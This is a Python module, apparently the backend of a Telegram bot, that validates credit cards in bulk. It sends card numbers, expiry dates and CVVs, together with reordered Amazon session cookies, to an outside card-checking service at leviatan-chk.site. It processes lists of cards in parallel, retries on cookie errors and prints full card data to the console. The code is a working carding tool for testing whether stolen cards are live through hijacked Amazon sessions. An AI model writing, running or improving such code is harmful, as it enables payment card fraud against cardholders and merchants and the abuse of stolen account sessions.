import requests
import asyncio
import json
import time
from threading import Lock
from collections import defaultdict
import concurrent.futures
from functools import partial

# Variables globales para control de concurrencia
global_semaphore = asyncio.Semaphore(15)  # Máximo 15 peticiones simultáneas globales
user_semaphore = asyncio.Semaphore(3)  # Máximo 3 peticiones simultáneas por usuario

# Contadores para estadísticas
active_requests_count = 0
user_request_count = defaultdict(int)

def formatear_cookies_leviatan(cookies):
    """
    Formatea las cookies en el ORDEN EXACTO que Leviatán necesita
    """
    # Primero, eliminar escapes de Telegram
    cookies_fixed = cookies.replace('\\_', '_').replace('\\"', '"')
    
    # Eliminar espacios después de los puntos y coma
    cookies_fixed = cookies_fixed.replace('; ', ';')
    
    # Separar las cookies en un diccionario
    cookie_dict = {}
    for cookie in cookies_fixed.split(';'):
        if '=' in cookie:
            key, value = cookie.split('=', 1)
            cookie_dict[key] = value
    
    # ORDEN ESPECÍFICO que Leviatán necesita (basado en la documentación)
    orden_esencial = [
        'session-id',
        'session-id-time',
        'session-token',
        'ubid-acbmx',
        'lc-acbmx',
        'i18n-prefs',
        'sso-state-acbmx',
        'at-acbmx',
        'sess-at-acbmx',
        'sst-acbmx',
        'x-acbmx'
    ]
    
    # Reconstruir las cookies en el orden correcto
    cookies_formateadas = []
    for key in orden_esencial:
        if key in cookie_dict:
            cookies_formateadas.append(f"{key}={cookie_dict[key]}")
    
    # Añadir cualquier cookie adicional
    for key, value in cookie_dict.items():
        if key not in orden_esencial:
            cookies_formateadas.append(f"{key}={value}")
    
    # Unir las cookies en el formato correcto
    return ';'.join(cookies_formateadas)

async def _make_api_request(card_data, cookies_formateadas, user_id):
    """
    Función interna para hacer la petición al API con control de concurrencia
    """
    global active_requests_count
    
    # URL de la API
    url = "https://leviatan-chk.site/amazon/leviatan"
    
    # Datos de la tarjeta y cookies formateadas
    data = {
        "card": card_data,
        "cookies": cookies_formateadas
    }
    
    # Headers IMPORTANTES
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    # Incrementar contador de peticiones activas
    active_requests_count += 1
    
    try:
        # Realizar la petición con timeout para evitar bloqueos
        response = await asyncio.to_thread(
            requests.post, 
            url, 
            json=data, 
            headers=headers,
            timeout=15
        )
        result = response.json()
        
        # Imprimir información de depuración
        print(f"Usuario {user_id} - Código de estado: {response.status_code}")
        print(f"Usuario {user_id} - Respuesta cruda: {response.text}")
        print(f"Usuario {user_id} - Cookies formateadas enviadas: {cookies_formateadas[:100]}...")
        print(f"Usuario {user_id} - Tarjeta enviada: {card_data}")
        
        return result
    except Exception as e:
        print(f"Usuario {user_id} - Error en petición: {str(e)}")
        raise e
    finally:
        # Decrementar contador de peticiones activas
        active_requests_count -= 1

async def amazon_check(card_data, cookies, user_id=None):
    """
    Verifica una tarjeta de crédito usando la API de Leviatán
    
    Args:
        card_data (str): Datos de la tarjeta en formato "numero|mes|año|cvv"
        cookies (str): Cookies de sesión de Amazon
        user_id (int): ID del usuario para control de concurrencia
        
    Returns:
        dict: Respuesta con status y message
    """
    try:
        # Si no se proporciona user_id, usar un valor por defecto
        if user_id is None:
            user_id = 0
        
        # Incrementar contador de peticiones del usuario
        user_request_count[user_id] += 1
        
        try:
            # FORMATEO CRÍTICO: Las cookies deben estar en el ORDEN EXACTO
            cookies_formateadas = formatear_cookies_leviatan(cookies)
            
            # LIMPIEZA CRÍTICA: Eliminar espacios extraños de los datos de la tarjeta
            card_data_limpio = card_data.strip()
            
            # Usar semáforos para controlar la concurrencia
            async with global_semaphore:
                async with user_semaphore:
                    print(f"Usuario {user_id} - Iniciando procesamiento de tarjeta: {card_data_limpio[:6]}xxxx")
                    print(f"Peticiones globales activas: {active_requests_count}")
                    print(f"Peticiones del usuario {user_id} activas: {user_request_count[user_id]}")
                    
                    # Pequeño delay aleatorio para evitar que todas las peticiones lleguen exactamente al mismo tiempo
                    await asyncio.sleep(0.1 + (user_id % 5) * 0.05)
                    
                    # Realizar la petición
                    result = await _make_api_request(card_data_limpio, cookies_formateadas, user_id)
                    
                    return {
                        "status": result.get("status", "⚠️ Error"),
                        "message": result.get("message", "Error desconocido")
                    }
        finally:
            # Decrementar contador de peticiones del usuario
            user_request_count[user_id] -= 1
                
    except Exception as e:
        return {
            "status": "⚠️ Error",
            "message": f"Error al conectar con la API: {str(e)}"
        }

async def amazon_check_multiple(cards_data, cookies, user_id=None, callback=None):
    """
    Verifica múltiples tarjetas de crédito usando la API de Leviatán
    CON PROCESAMIENTO VERDADERAMENTE PARALELO Y RESULTADOS EN TIEMPO REAL
    
    Args:
        cards_data (list): Lista de datos de tarjetas en formato "numero|mes|año|cvv"
        cookies (str): Cookies de sesión de Amazon
        user_id (int): ID del usuario para control de concurrencia
        callback (function): Función de callback para enviar resultados en tiempo real
        
    Returns:
        list: Lista de respuestas de la API para cada tarjeta
    """
    try:
        # Si no se proporciona user_id, usar un valor por defecto
        if user_id is None:
            user_id = 0
        
        # FORMATEO CRÍTICO: Las cookies deben estar en el ORDEN EXACTO
        cookies_formateadas = formatear_cookies_leviatan(cookies)
        
        # LIMPIEZA CRÍTICA: Eliminar espacios extraños de todos los datos de las tarjetas
        cards_data_limpios = [card.strip() for card in cards_data if card.strip()]
        
        print(f"Usuario {user_id} - Iniciando procesamiento masivo de {len(cards_data_limpios)} tarjetas")
        
        # PROCESAMIENTO PARALELO CON RESULTADOS EN TIEMPO REAL: 
        # En lugar de esperar a que todas las tareas se completen, procesamos cada una individualmente
        # y enviamos los resultados a medida que se completan
        
        # Lista para almacenar los resultados finales
        results = [None] * len(cards_data_limpios)
        
        # Crear una cola para los resultados
        result_queue = asyncio.Queue()
        
        # Función para procesar una tarjeta individualmente
        async def process_single_card(index, card_data):
            try:
                print(f"Usuario {user_id} - Tarjeta {index+1}/{len(cards_data_limpios)} - Iniciando procesamiento")
                
                # Intentar procesar la tarjeta (con hasta 3 reintentos)
                max_retries = 3
                retry_count = 0
                success = False
                
                while retry_count < max_retries and not success:
                    try:
                        # Usar semáforos para controlar la concurrencia
                        async with global_semaphore:
                            async with user_semaphore:
                                print(f"Usuario {user_id} - Tarjeta {index+1}/{len(cards_data_limpios)} - Intento {retry_count+1}/{max_retries}")
                                print(f"Peticiones globales activas: {active_requests_count}")
                                print(f"Peticiones del usuario {user_id} activas: {user_request_count[user_id]}")
                                
                                # Pequeño delay aleatorio para evitar que todas las peticiones lleguen exactamente al mismo tiempo
                                await asyncio.sleep(0.1 + (index % 5) * 0.05)
                                
                                # Realizar la petición
                                result = await _make_api_request(card_data, cookies_formateadas, user_id)
                                
                                # Imprimir información de depuración
                                print(f"Usuario {user_id} - Tarjeta {index+1}/{len(cards_data_limpios)} - Respuesta: {result.get('status', 'Error')}")
                                
                                # Verificar si la respuesta es exitosa (no "Cookies no detectados")
                                if result.get('status') != "⚠️ Error" or "Cookies no detectados" not in result.get('message', ''):
                                    # Éxito, salir del bucle de reintentos
                                    success = True
                                    print(f"Usuario {user_id} - Tarjeta {index+1} procesada exitosamente")
                                    
                                    # Añadir el resultado a la cola para procesamiento inmediato
                                    await result_queue.put((index, result))
                                    return result
                                else:
                                    # Error de cookies, incrementar contador de reintentos
                                    retry_count += 1
                                    if retry_count < max_retries:
                                        print(f"Usuario {user_id} - Error de cookies, reintentando en 3 segundos...")
                                        await asyncio.sleep(3)
                                    else:
                                        # Agotados los reintentos, devolver el resultado de error
                                        print(f"Usuario {user_id} - Agotados los reintentos para la tarjeta {index+1}")
                                        
                                        # Añadir el resultado a la cola para procesamiento inmediato
                                        await result_queue.put((index, result))
                                        return result
                        
                    except Exception as e:
                        print(f"Usuario {user_id} - Error en el intento {retry_count+1}: {e}")
                        retry_count += 1
                        if retry_count < max_retries:
                            print(f"Usuario {user_id} - Reintentando en 3 segundos...")
                            await asyncio.sleep(3)
                        else:
                            # Agotados los reintentos, devolver resultado de error
                            print(f"Usuario {user_id} - Agotados los reintentos para la tarjeta {index+1}")
                            
                            error_result = {
                                "status": "⚠️ Error",
                                "message": f"Error al procesar tarjeta: {str(e)}"
                            }
                            
                            # Añadir el resultado a la cola para procesamiento inmediato
                            await result_queue.put((index, error_result))
                            return error_result
                    
            except Exception as e:
                print(f"Usuario {user_id} - Error procesando tarjeta {index+1}: {e}")
                
                error_result = {
                    "status": "⚠️ Error",
                    "message": f"Error al procesar tarjeta: {str(e)}"
                }
                
                # Añadir el resultado a la cola para procesamiento inmediato
                await result_queue.put((index, error_result))
                return error_result
        
        # Crear todas las tareas pero no esperar a que se completen
        tasks = []
        for i, card in enumerate(cards_data_limpios):
            task = asyncio.create_task(process_single_card(i, card))
            tasks.append(task)
        
        # Procesador de resultados en tiempo real
        async def process_results():
            processed_count = 0
            
            while processed_count < len(cards_data_limpios):
                try:
                    # Esperar un resultado con timeout para no bloquear indefinidamente
                    index, result = await asyncio.wait_for(result_queue.get(), timeout=1.0)
                    
                    # Almacenar el resultado en la posición correcta
                    results[index] = result
                    processed_count += 1
                    
                    # Si hay una función de callback, llamarla para enviar el resultado inmediatamente
                    if callback:
                        await callback(index, result, cards_data_limpios[index], user_id)
                        
                except asyncio.TimeoutError:
                    # No hay resultados disponibles en este momento, continuar
                    pass
                except Exception as e:
                    print(f"Error procesando resultados: {e}")
                    break
        
        # Iniciar el procesador de resultados en paralelo
        result_processor = asyncio.create_task(process_results())
        
        # Esperar a que todas las tareas se completen
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Esperar a que el procesador de resultados termine
        await result_processor
        
        print(f"Usuario {user_id} - Procesadas {len([r for r in results if r is not None])} tarjetas en paralelo")
        
        return results
                
    except Exception as e:
        return [{
            "status": "⚠️ Error",
            "message": f"Error al conectar con la API: {str(e)}"
        }]